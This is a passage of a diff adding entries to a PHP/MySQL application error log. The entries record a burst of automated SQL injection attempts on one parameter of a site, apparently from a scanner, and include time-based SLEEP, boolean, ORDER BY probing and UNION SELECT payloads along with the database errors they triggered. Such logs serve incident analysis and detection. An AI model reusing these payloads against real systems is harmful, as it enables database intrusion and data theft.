+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15');(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:59</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15';(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:00</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'));(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '));(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:00</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15')));(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')));(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:00</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15%');(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:00</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15%'));(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '));(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:00</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15%')));(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')));(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:01</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15%';(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:01</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15') WHERE 7384=7384;(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') WHERE 7384=7384;(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:02</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15' WHERE 4575=4575;(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 4575=4575;(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY i' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:02</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'||(SELECT 'xWsZ' FROM DUAL WHERE 1441=1441;(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:02</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'||(SELECT 'ExdF' WHERE 3784=3784;(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:02</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'+(SELECT BqOn WHERE 8025=8025;(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:03</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'+(SELECT 'rlcl' WHERE 1794=1794;(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:03</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15')) AS TBMk WHERE 9712=9712;(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AS TBMk WHERE 9712=9712;(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:03</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15') AS vNlU WHERE 8916=8916;(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS vNlU WHERE 8916=8916;(SELECT * FROM (SELECT(SLEEP(5)))NjMx)#' AND status=1 ' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:09</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15');(SELECT * FROM (SELECT(SLEEP(5)))HhWy)-- YMxu' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');(SELECT * FROM (SELECT(SLEEP(5)))HhWy)-- YMxu' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:09</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15';(SELECT * FROM (SELECT(SLEEP(5)))HhWy)-- froV' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(SELECT * FROM (SELECT(SLEEP(5)))HhWy)-- froV' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:10</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15');(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND ('NINv'='NINv' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND ('NINv'='NINv' AND status=1 ORDER B' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:10</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'));(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND (('bvGl'='bvGl' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '));(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND (('bvGl'='bvGl' AND status=1 ORDER' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:10</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15')));(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND ((('KHYO'='KHYO' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')));(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND ((('KHYO'='KHYO' AND status=1 ORD' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:10</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15';(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND 'NWoh'='NWoh' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND 'NWoh'='NWoh' AND status=1 ORDER BY i' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:10</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15');(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND ('Wuod' LIKE 'Wuod' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND ('Wuod' LIKE 'Wuod' AND status=1 OR' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:10</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'));(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND (('jNLl' LIKE 'jNLl' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '));(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND (('jNLl' LIKE 'jNLl' AND status=1 ' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:11</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15')));(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND ((('dfJR' LIKE 'dfJR' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')));(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND ((('dfJR' LIKE 'dfJR' AND status=' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:11</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15';(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND 'YECQ' LIKE 'YECQ' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND 'YECQ' LIKE 'YECQ' AND status=1 ORDER' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:12</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15%');(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND ('%'='' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND ('%'='' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:12</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15%'));(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND (('%'='' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '));(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND (('%'='' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:12</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15%')));(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND ((('%'='' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')));(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND ((('%'='' AND status=1 ORDER BY i' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:12</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15%';(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND '%'='' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(SELECT * FROM (SELECT(SLEEP(5)))HhWy) AND '%'='' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:13</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15') WHERE 7571=7571;(SELECT * FROM (SELECT(SLEEP(5)))HhWy)-- ygpE' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') WHERE 7571=7571;(SELECT * FROM (SELECT(SLEEP(5)))HhWy)-- ygpE' AND status=1 OR' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:13</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15' WHERE 3016=3016;(SELECT * FROM (SELECT(SLEEP(5)))HhWy)-- Ymdi' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 3016=3016;(SELECT * FROM (SELECT(SLEEP(5)))HhWy)-- Ymdi' AND status=1 ORDE' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:13</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'||(SELECT 'AMEm' FROM DUAL WHERE 7420=7420;(SELECT * FROM (SELECT(SLEEP(5)))HhWy))||'' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';(SELECT * FROM (SELECT(SLEEP(5)))HhWy))||'' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:13</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'||(SELECT 'Icmk' WHERE 2844=2844;(SELECT * FROM (SELECT(SLEEP(5)))HhWy))||'' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';(SELECT * FROM (SELECT(SLEEP(5)))HhWy))||'' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:13</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'+(SELECT Xnwa WHERE 1045=1045;(SELECT * FROM (SELECT(SLEEP(5)))HhWy))+'' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';(SELECT * FROM (SELECT(SLEEP(5)))HhWy))+'' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:14</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'+(SELECT 'gHsF' WHERE 7739=7739;(SELECT * FROM (SELECT(SLEEP(5)))HhWy))+'' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';(SELECT * FROM (SELECT(SLEEP(5)))HhWy))+'' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:14</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15') AS DvSu WHERE 1903=1903;(SELECT * FROM (SELECT(SLEEP(5)))HhWy)-- FSQa' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS DvSu WHERE 1903=1903;(SELECT * FROM (SELECT(SLEEP(5)))HhWy)-- FSQa' AND sta' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:29</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15') ORDER BY 1-- mwop' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') ORDER BY 1-- mwop' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:30</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15' ORDER BY 8836-- Spth' AND status=1 ORDER BY id, ## Unknown column '8836' in 'order clause' ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:07:31</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15' ORDER BY 40-- bmra' AND status=1 ORDER BY id, ## Unknown column '40' in 'order clause' ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:18:53</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15')) AS QHpB WHERE 4444=4444 UNION ALL SELECT CONCAT(0x716a7a7a71,0x69786277554f50454e41646b476c53655a5541484d6d4e67687a7a4e78785874505041496c537a70,0x7176716a71),70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AS QHpB WHERE 4444=4444 UNION ALL SELECT CONCAT(0x716a7a7a71,0x69786277554f50' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:18:57</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15')) AS FhjW WHERE 3082=3082 UNION ALL SELECT CONCAT(0x716a7a7a71,0x4c6f64576e6b79587149,0x7176716a71),70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AS FhjW WHERE 3082=3082 UNION ALL SELECT CONCAT(0x716a7a7a71,0x4c6f64576e6b79' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:19:00</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='-5295')) AS sAfN WHERE 3048=3048 UNION ALL SELECT CONCAT(0x716a7a7a71,0x524d48437a4c4c5572435258657642534b6d644251744b71696d51434b78496b79546a56566a7059,0x7176716a71),70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AS sAfN WHERE 3048=3048 UNION ALL SELECT CONCAT(0x716a7a7a71,0x524d48437a4c4c' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:19:04</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='-9474')) AS NfoL WHERE 4698=4698 UNION ALL SELECT CONCAT(0x716a7a7a71,0x56717a48506544417343,0x7176716a71),70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AS NfoL WHERE 4698=4698 UNION ALL SELECT CONCAT(0x716a7a7a71,0x56717a48506544' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:19:24</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15') AS oerT WHERE 4658=4658 UNION ALL SELECT CONCAT(0x716a7a7a71,0x526c6d6866735964547667794c496a69426b67454f675362617976677046466e496b526750614d57,0x7176716a71),70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS oerT WHERE 4658=4658 UNION ALL SELECT CONCAT(0x716a7a7a71,0x526c6d686673596' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:19:28</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15') AS HwXt WHERE 9064=9064 UNION ALL SELECT CONCAT(0x716a7a7a71,0x415471447a6778697078,0x7176716a71),70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS HwXt WHERE 9064=9064 UNION ALL SELECT CONCAT(0x716a7a7a71,0x415471447a67786' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
